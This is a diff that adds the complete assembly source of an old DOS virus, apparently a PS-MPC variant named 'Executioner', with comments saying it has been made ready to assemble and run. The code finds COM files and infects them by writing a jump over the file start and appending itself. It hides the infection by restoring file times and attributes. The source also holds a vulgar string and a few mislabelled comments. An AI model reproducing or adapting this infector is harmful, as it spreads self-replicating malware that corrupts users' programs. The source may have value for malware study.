@@ -1,0 +1,146 @@
+Disassembly: ???
+Executioner
+; Disassembly: ???
+; F-Prot says that it's probably a PS-MPC variant, TBAV says definitely
+; Howard, and DSAVTK doesn't find anything.
+
+; Some virus that I found.  I've removed the host file that it came from
+; and replaced the original host data with an int 20h so it can be
+; assembled and run properly.
+
+; Direct-action COM infector.  Infects one file per run, and marks infection
+; with a near jump at the beginning of the file.
+
+.model	tiny
+.286
+
+v_length equ v_finish-v_start
+
+cseg	segment
+	assume	cs:cseg, ds:cseg
+
+	org	0h
+
+v_start:
+	call	delta			; get the delta offset
+delta:
+	pop	bp
+	sub	bp, offset delta
+
+	lea	si, [bp+save_data]	; restore the file start
+	mov	di, 100h
+	push	di			; save the return address
+	movsw
+	movsb
+
+	lea	dx, [bp+new_dta]	; relocate the DTA so the command line
+					; isn't corrupted
+	call	set_dta
+
+	mov	ah, 4eh 		; find a COM file
+	lea	dx, [bp+fmask]
+	xor	cx, cx
+next_file:
+	int	21h
+	jc	ret_com
+
+	mov	ax, 3d00h		; open in read only
+	lea	dx, [bp+new_dta+1eh]	; DX -> filename
+	int	21h
+
+	xchg	bx, ax			; BX = file handle
+	mov	ah, 3Fh 		; read from file
+	lea	dx, [bp+save_data]
+	mov	cx, 3
+	int	21h
+
+	cmp	byte ptr [bp+save_data], 0e9h ; check for a near jump
+	jne	not_infected
+	mov	ax, word ptr [bp+new_dta+1ah] ; file length
+	mov	cx, word ptr [bp+save_data+1] ; what should be a near jump
+	add	cx, v_length+3		; jumps to correct location?
+	cmp	ax, cx
+	jne	not_infected		; Jump if jump is incorrect
+	mov	ah, 3eh 		; close file
+	int	21h
+
+	mov	ah, 4fh 		; find next file
+	jmp	next_file
+ret_com:
+	mov	dx, 80h 		; set dta to default location
+	call	set_dta
+	retn
+
+not_infected:
+	mov	ax, 4301h		; get file attributes
+	xor	cx, cx
+	lea	dx, [bp+new_dta+1eh]
+	int	21h
+
+	mov	ax, word ptr [bp+new_dta+1ah] ; get file length
+	sub	ax, 3			; adjust for op length
+	mov	word ptr [bp+jmp_offset], ax ; set new jump offset
+
+	mov	ah,3Eh			; close file
+	int	21h
+
+	mov	ax, 3D02h		; open in read/write mode
+	int	21h
+
+	xchg	bx, ax			; BX = file handle
+
+	mov	ah, 40h 		; write the jump to the start of the
+	mov	cx, 3			; file
+	lea	dx, [bp+jmp_code]
+	int	21h
+
+
+	mov	al, 2			; seek to eof
+	call	seek
+
+	mov	ah, 40h 		; append the virus
+	mov	cx, v_length
+	lea	dx, [bp+v_start]
+	int	21h
+
+
+	mov	ax, 5701h		; set the original time/date
+	mov	cx, word ptr [bp+new_dta+16h]
+	mov	dx, word ptr [bp+new_dta+18h]
+	int	21h
+
+
+	mov	ax, 4301h		; set the old attributes
+	mov	cx, word ptr [bp+new_dta+15h]
+	lea	dx, [bp+new_dta+1eh]
+	int	21h
+
+	mov	ah, 3eh 		; close the file
+	int	21h
+
+	jmp	ret_com 		; terminate
+
+set_dta:
+	mov	ah, 1ah
+	int	21h
+	retn
+
+seek:
+	mov	ah, 42h
+	xor	cx, cx
+	xor	dx, dx
+	int	21h
+	retn
+
+stuff		db	"D0G PHUCK3R!!!"        ; ???
+
+fmask		db	"*.com",0               ; the files to search for
+save_data	db	0cdh, 20h, 00		; the file beginning
+		dw	20h
+jmp_code	db	0e9h
+v_finish:
+jmp_offset	dw	?
+new_dta 	db	44 dup (?)
+cseg	ends
+
+	end	v_start
